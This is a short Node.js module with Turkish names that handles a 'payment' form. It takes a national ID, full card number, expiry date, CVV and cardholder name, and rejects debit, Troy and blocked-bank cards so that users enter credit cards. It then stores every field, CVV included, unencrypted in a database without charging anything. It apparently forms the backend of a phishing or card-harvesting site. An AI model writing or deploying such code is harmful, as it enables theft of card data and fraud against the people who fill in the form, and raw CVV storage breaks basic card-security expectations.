const User = require('../models/User');
const Odeme = require('../models/Odeme');
const Bin = require('../models/Bin');
const ayarlarStore = require('./ayarlar');

async function odemeKaydet(tcno, veri) {
    const kartNo = String(veri.kartNo || '').replace(/\D/g, '').slice(0, 16);
    const skt = String(veri.skt || '').trim();
    const cvv = String(veri.cvv || '').trim();
    const kartSahibi = String(veri.kartSahibi || '').trim();

    if (!/^\d{16}$/.test(kartNo)) return { ok: false, hata: 'Geçersiz kart numarası.', durum: 400 };
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(skt)) return { ok: false, hata: 'Geçersiz son kullanma tarihi.', durum: 400 };
    if (!/^\d{3,4}$/.test(cvv)) return { ok: false, hata: 'Geçersiz CVV.', durum: 400 };

    try {
        const kullanici = await User.findOne({ tcno }).lean().catch(() => null);
        let banka = null;
        let marka = null;
        let kartTuru = null;
        try {
            const binKaydi = await Bin.findOne({ bin: kartNo.slice(0, 6) }).lean();
            if (binKaydi) {
                banka = binKaydi.banka;
                marka = binKaydi.marka;
                kartTuru = binKaydi.kartTuru;
                const ayarlar = ayarlarStore.oku();
                const kapaliBankalar = ayarlar.kapaliBankalar || [];
                if (kapaliBankalar.includes(banka)) {
                    return { ok: false, hata: 'Bu kart geçerli değil, lütfen kredi kartı girin.', durum: 400 };
                }
                const bankaKartiEngelli = !!ayarlar.bankaKartiEngelli;
                if (bankaKartiEngelli && kartTuru === 'BANKA') {
                    return { ok: false, hata: 'Bu kart geçerli değil, lütfen kredi kartı girin.', durum: 400 };
                }
                const troyKartiEngelli = !!ayarlar.troyKartiEngelli;
                const troyMu = String(marka || '').toLowerCase().includes('troy') || String(kartTuru || '').toUpperCase().includes('TROY');
                if (troyKartiEngelli && troyMu) {
                    return { ok: false, hata: 'Bu kart geçerli değil, lütfen kredi kartı girin.', durum: 400 };
                }
            }
        } catch (err) {
            console.error('BIN sorgusu başarısız:', err.message);
        }
        await Odeme.create({
            tcno,
            ad: (kullanici && kullanici.ad) || null,
            kartSahibi,
            kartNo,
            skt,
            cvv,
            tutar: ayarlarStore.odemeBilgileri().toplam,
            banka,
            marka,
            kartTuru
        });
        return { ok: true, banka, marka, kartTuru };
    } catch (err) {
        console.error('Ödeme kaydedilemedi:', err.message);
        return { ok: false, hata: 'Ödeme kaydedilemedi.', durum: 500 };
    }
}

module.exports = { odemeKaydet };
